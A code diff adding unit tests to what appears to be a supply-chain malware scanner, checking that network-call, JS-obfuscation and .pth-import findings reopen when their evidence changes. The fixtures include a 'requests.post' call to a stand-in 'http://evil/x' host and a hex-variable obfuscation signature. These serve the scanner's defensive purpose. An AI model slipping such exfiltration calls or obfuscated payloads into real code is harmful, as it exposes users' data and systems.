@@ -450,6 +450,51 @@ def test_extract_evidence_binds_call_continuation_past_12_lines():
     assert sp._evidence_hash(eo) != sp._evidence_hash(en)
 
 
+def test_logical_line_end_follows_backslash_continuation():
+    # A call split with an explicit backslash before the parenthesis must still
+    # bind the continuation line, so changing the URL on the next physical line
+    # reopens instead of returning at the zero-depth API line.
+    old = "requests.post \\\n    ('http://old/x', data = 1)\n"
+    new = "requests.post \\\n    ('http://evil/x', data = 1)\n"
+    eo = sp._extract_evidence(old, sp.RE_NETWORK)
+    en = sp._extract_evidence(new, sp.RE_NETWORK)
+    assert sp._evidence_hash(eo) != sp._evidence_hash(en)
+
+
+def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
+    # A >100 KB JS bundle that also trips the hex-var obfuscation signature binds
+    # the whole bundle, so changing payload code elsewhere (obfuscation line
+    # unchanged) reopens rather than riding the matched signature line.
+    obf = "var _0xabcd = function(){};\n"
+    pad = "// filler\n" * 11000  # push the file over the 100 KB large-bundle bar
+    fo = sp.check_js_file(obf + pad + "var payload = 'old';\n", "pkg/bundle.js", "pkg")
+    fn = sp.check_js_file(obf + pad + "var payload = 'evil';\n", "pkg/bundle.js", "pkg")
+    co = [f for f in fo if "hex-var obfuscation" in f.check][0]
+    cn = [f for f in fn if "hex-var obfuscation" in f.check][0]
+    assert "bundle-sha256:" in co.evidence
+    assert sp._evidence_hash(co.evidence) != sp._evidence_hash(cn.evidence)
+
+
+def test_pth_catch_all_import_evidence_is_bounded_but_reopens():
+    # A large .pth made only of benign-looking imports is bounded in the evidence
+    # (prefix plus digest), not dumped in full, yet still reopens when an import
+    # line changes because the digest covers every line.
+    base = "".join(f"import mod{i}\n" for i in range(200))
+    fo = [
+        f
+        for f in sp.check_pth_file(base + "import secret_old\n", "p/x.pth", "p")
+        if "executable import line" in f.check
+    ]
+    fn = [
+        f
+        for f in sp.check_pth_file(base + "import secret_evil\n", "p/x.pth", "p")
+        if "executable import line" in f.check
+    ]
+    assert fo and fn
+    assert "sha256:" in fo[0].evidence and len(fo[0].evidence) < len(base)
+    assert sp._evidence_hash(fo[0].evidence) != sp._evidence_hash(fn[0].evidence)
+
+
 def test_extract_evidence_records_all_multiline_matches():
     # The DOTALL fallback must record every distinct cross-line match, so a second
     # long-sleep appended below an already-flagged one reopens the finding.
